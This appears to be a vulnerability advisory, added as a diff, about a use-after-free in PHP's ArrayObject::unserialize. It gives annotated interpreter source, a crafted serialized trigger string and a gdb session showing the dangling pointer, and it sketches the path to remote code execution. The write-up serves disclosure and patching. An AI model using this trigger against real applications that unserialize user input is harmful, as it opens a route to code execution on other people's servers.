@@ -1,0 +1,321 @@
+Summary
+-------
+
+During unserialization of an `ArrayObject` a dangling pointer to a `zval` is
+inadvertantly created. By correctly crafting their input to `unserialize` an
+attacker can cause this dangling pointer to be swapped into the `array` field of
+the `spl_array_object`, which is created during unserialization. The attacker
+can then cause the deallocated `zval` to be reallocated and initialized with
+data that they fully control. The outcome of this is that
+`spl_array_object->array` points to a forged `zval` structure and, as shown in
+prior research, an attacker has many paths from there towards code execution.
+The most common approach being to set the `type` field of the `zval` to equal
+`IS_ARRAY` and rewrite the `ht` field to point to a forged `HashTable`
+structure. On destruction, if the forged `HashTable` contains a pointer to a
+destructor function then this will be called.
+
+Impact
+------
+
+This vulnerability can be leveraged to achieve remote code execution. Any
+application that calls `unserialize` on user provided data is potentially
+vulnerable although exploitation will be somewhat application specific.
+
+Patch Details
+-------------
+
+The patch updates SPL_METHOD(Array, unserialize) to ensure that the `pflags`
+variable is not destroyed until after the `var_hash`, which contains a reference
+to it.
+
+Bug Details
+-----------
+
+File: ext/spl/spl_array.c
+
+1736 SPL_METHOD(Array, unserialize)
+1737 {
+
+...
+
+1744         zval *pmembers, *pflags = NULL;
+
+...
+
+1771         ALLOC_INIT_ZVAL(pflags);
+1772         if (!php_var_unserialize(&pflags, &p, s + buf_len, &var_hash TSRMLS_CC) || Z_TYPE_P(pflags) != IS_LONG) {
+1773                 zval_ptr_dtor(&pflags);
+1774                 goto outexcept;
+1775         }
+1776
+1777         --p; /* for ';' */
+1778         flags = Z_LVAL_P(pflags);
+1779         zval_ptr_dtor(&pflags);
+
+During unserialization the `var_hash` variable is used to record pointers to the
+`zval` structures associated with the unserialized data. The outcome of this is
+that after `php_var_unserialize` the `var_hash` structure contains the value of
+the `pflags` variable. Under normal operation this is perfectly fine, as the
+`var_hash` structure is used to handle the unserialization of references. e.g.
+when a 'reference' field is encountered in the serialized data it indicates what
+it actually references by means of an index. This index is really an index into
+the `var_hash` structure.
+
+The problem is the call to `zval_ptr_dtor` on line 1779. After this call
+`var_hash` still contains the address of the `zval` pointed to by `pflags`, but
+the memory backing this `zval` has been returned to the heap. The questiont then
+becomes, "Is it possible to access and use this dangling pointer before the
+`var_hash` structure is itself destroyed?". As it happens, this is fairly
+straightforward as the following code is soon executed:
+
+File: ext/spl/spl_array.c
+
+1790         if (*p!='m') {
+1791                 if (*p!='a' && *p!='O' && *p!='C' && *p!='r') {
+1792                         goto outexcept;
+1793                 }
+1794                 intern->ar_flags &= ~SPL_ARRAY_CLONE_MASK;
+1795                 intern->ar_flags |= flags & SPL_ARRAY_CLONE_MASK;
+1796                 zval_ptr_dtor(&intern->array);
+1797                 ALLOC_INIT_ZVAL(intern->array);
+1798                 if (!php_var_unserialize(&intern->array, &p, s + buf_len, &var_hash TSRMLS_CC)) {
+1799                         goto outexcept;
+1800                 }
+1801         }
+
+In the above code `p` has type `unsigned char *` and points to the string being
+unserialized. At this stage it points towards the indicator for the type of the
+next item to be unserialized. So, if the next character in the sequence is not
+'m' and holds one of the characters compared against on line 1791
+`php_var_unserialize` will be called again and provided the `var_hash` which
+contains the dangling pointer. With some knowledge of how PHP unserializes items
+we can see that these conditions are exactly what we require. The 'r' item type
+is the indicator for a reference, and during the unserialization of a reference
+the `var_hash` structure will consulted to retrieve the appropriate `zval *`,
+which will then be swapped into the first argument to `php_var_unserialize`, a
+`zval **`.
+
+File: ext/standard/var_unserializer.re
+
+507 "r:" iv ";"             {
+508         long id;
+509
+510         *p = YYCURSOR;
+511         if (!var_hash) return 0;
+512
+513         id = parse_iv(start + 2) - 1;
+514         if (id == -1 || var_access(var_hash, id, &rval_ref) != SUCCESS) {
+515                 return 0;
+516         }
+517
+518         if (*rval == *rval_ref) return 0;
+519
+520         if (*rval != NULL) {
+521                 var_push_dtor_no_addref(var_hash, rval);
+522         }
+523         *rval = *rval_ref;
+524         Z_ADDREF_PP(rval);
+525         Z_UNSET_ISREF_PP(rval);
+526
+527         return 1;
+528 }
+
+On line 514 the `var_hash` structure is consulted to find the appropriate `zval
+*`. This pointer is then swapped into the first argument to
+`php_var_unserialize` on line 523. Once this handler returns the `intern->array`
+variable in `SPL_METHOD(Array, unserialize)` contains the dangling pointer.
+
+We can demonstrate this by providing the string
+`C:11:"ArrayObject":20:{x:i:0;r:2;;m:a:0:{};}` to `unserialize`.
+
+###############################################################################
+
+$ gdb -q ~/Git/php-src/sapi/cli/php
+Reading symbols from /home/sean/Git/php-src/sapi/cli/php...done.
+(gdb) b zim_spl_Array_unserialize
+Breakpoint 1 at 0x6a5149: file /home/sean/Git/php-src/ext/spl/spl_array.c, line 1737.
+(gdb) r deserialise.php /tmp/simple_poc.sz
+Starting program: /home/sean/Git/php-src/sapi/cli/php deserialise.php /tmp/simple_poc.sz
+C:11:"ArrayObject":20:{x:i:0;r:2;;m:a:0:{};}
+
+Breakpoint 1, zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0,
+    this_ptr=0x7ffff7fc9b88, return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1737
+1737	{
+(gdb) l
+1732
+1733	/* {{{ proto void ArrayObject::unserialize(string serialized)
+1734	 * unserialize the object
+1735	 */
+1736	SPL_METHOD(Array, unserialize)
+1737	{
+1738		spl_array_object *intern = (spl_array_object*)zend_object_store_get_object(getThis() TSRMLS_CC);
+1739
+1740		char *buf;
+1741		int buf_len;
+(gdb)
+1742		const unsigned char *p, *s;
+1743		php_unserialize_data_t var_hash;
+1744		zval *pmembers, *pflags = NULL;
+1745		HashTable *aht;
+1746		long flags;
+1747
+1748		if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &buf, &buf_len) == FAILURE) {
+1749			return;
+1750		}
+1751
+(gdb)
+1752		if (buf_len == 0) {
+1753			return;
+1754		}
+1755
+1756		aht = spl_array_get_hash_table(intern, 0 TSRMLS_CC);
+1757		if (aht->nApplyCount > 0) {
+1758			zend_error(E_WARNING, "Modification of ArrayObject during sorting is prohibited");
+1759			return;
+1760		}
+1761
+(gdb)
+1762		/* storage */
+1763		s = p = (const unsigned char*)buf;
+1764		PHP_VAR_UNSERIALIZE_INIT(var_hash);
+1765
+1766		if (*p!= 'x' || *++p != ':') {
+1767			goto outexcept;
+1768		}
+1769		++p;
+1770
+1771		ALLOC_INIT_ZVAL(pflags);
+(gdb)
+1772		if (!php_var_unserialize(&pflags, &p, s + buf_len, &var_hash TSRMLS_CC) || Z_TYPE_P(pflags) != IS_LONG) {
+1773			zval_ptr_dtor(&pflags);
+1774			goto outexcept;
+1775		}
+1776
+1777		--p; /* for ';' */
+1778		flags = Z_LVAL_P(pflags);
+1779		zval_ptr_dtor(&pflags);
+1780		/* flags needs to be verified and we also need to verify whether the next
+1781		 * thing we get is ';'. After that we require an 'm' or somethign else
+(gdb) b 1779
+Breakpoint 2 at 0x6a535d: file /home/sean/Git/php-src/ext/spl/spl_array.c, line 1779.
+(gdb) c
+Continuing.
+
+Breakpoint 2, zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0,
+    this_ptr=0x7ffff7fc9b88, return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1779
+1779		zval_ptr_dtor(&pflags);
+(gdb) p/x pflags
+$1 = 0x7ffff7fc9d40
+(gdb) p/x ((var_entries*)var_hash->last)->data[0x1]
+$2 = 0x7ffff7fc9d40
+
+We have hit a breakpoint just before the `pflags` structure is destroyed. At
+this point we can see that a pointer to the `pflags` structure is stored within
+the `var_hash` structure.
+
+(gdb) s
+_zval_ptr_dtor (zval_ptr=0x7fffffff9750) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+424		i_zval_ptr_dtor(*zval_ptr ZEND_FILE_LINE_RELAY_CC TSRMLS_CC);
+(gdb)
+i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+424		i_zval_ptr_dtor(*zval_ptr ZEND_FILE_LINE_RELAY_CC TSRMLS_CC);
+(gdb)
+zval_delref_p (pz=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend.h:411
+411		return --pz->refcount__gc;
+(gdb)
+i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute.h:76
+76		if (!Z_DELREF_P(zval_ptr)) {
+(gdb)
+78			GC_REMOVE_ZVAL_FROM_BUFFER(zval_ptr);
+(gdb) n
+79			zval_dtor(zval_ptr);
+(gdb) s
+_zval_dtor (zvalue=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_variables.h:32
+32		if (zvalue->type <= IS_BOOL) {
+(gdb) n
+i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute.h:80
+80			efree_rel(zval_ptr);
+(gdb) s
+_efree (ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_alloc.c:2436
+2436		if (UNEXPECTED(!AG(mm_heap)->use_zend_alloc)) {
+
+The `pflags` structure has now been destroyed and the reference to it from
+`var_hash` is dangling.
+
+(gdb) finish
+Run till exit from #0  _efree (ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_alloc.c:2436
+0x00000000007f3b2b in i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute.h:80
+80			efree_rel(zval_ptr);
+(gdb) n
+_zval_ptr_dtor (zval_ptr=0x7fffffff9750) at /home/sean/Git/php-src/Zend/zend_execute_API.c:425
+425	}
+(gdb)
+zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0, this_ptr=0x7ffff7fc9b88,
+    return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1785
+1785		if (*p != ';') {
+(gdb) l
+1780		/* flags needs to be verified and we also need to verify whether the next
+1781		 * thing we get is ';'. After that we require an 'm' or somethign else
+1782		 * where 'm' stands for members and anything else should be an array. If
+1783		 * neither 'a' or 'm' follows we have an error. */
+1784
+1785		if (*p != ';') {
+1786			goto outexcept;
+1787		}
+1788		++p;
+1789
+(gdb)
+1790		if (*p!='m') {
+1791			if (*p!='a' && *p!='O' && *p!='C' && *p!='r') {
+1792				goto outexcept;
+1793			}
+1794			intern->ar_flags &= ~SPL_ARRAY_CLONE_MASK;
+1795			intern->ar_flags |= flags & SPL_ARRAY_CLONE_MASK;
+1796			zval_ptr_dtor(&intern->array);
+1797			ALLOC_INIT_ZVAL(intern->array);
+1798			if (!php_var_unserialize(&intern->array, &p, s + buf_len, &var_hash TSRMLS_CC)) {
+1799				goto outexcept;
+(gdb)
+1800			}
+1801		}
+1802		if (*p != ';') {
+1803			goto outexcept;
+1804		}
+1805		++p;
+1806
+1807		/* members */
+1808		if (*p!= 'm' || *++p != ':') {
+1809			goto outexcept;
+(gdb) b 1798
+Breakpoint 3 at 0x6a544e: file /home/sean/Git/php-src/ext/spl/spl_array.c, line 1798.
+(gdb) c
+Continuing.
+
+Breakpoint 3, zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0,
+    this_ptr=0x7ffff7fc9b88, return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1798
+1798			if (!php_var_unserialize(&intern->array, &p, s + buf_len, &var_hash TSRMLS_CC)) {
+(gdb) x/s p
+0x7ffff7fcaad6:	"r:2;;m:a:0:{};"
+(gdb) p/x intern->array
+$3 = 0x7ffff7fc9cb0
+
+Prior to the `php_var_unserialize` call using our "reference" item
+`intern->array` points to the `zval` created on line 1797.
+
+(gdb) n
+1802		if (*p != ';') {
+(gdb) p/x intern->array
+$4 = 0x7ffff7fc9d40
+
+After `php_var_unserialize` returns `intern->array` points to the deallocated
+structure.
+
+###############################################################################
+
+From an attackers point of view the remaining work is to get the the deallocated
+`zval` reallocated using data which they control and then to trigger its use via
+the `intern->array` pointer. This is fairly straightforward and is explained in
+the attached Python script for generating a POC input. See crash_record.txt for
+a demonstration of what will happen when this POC is fed to `unserialize`.
+
+EOF
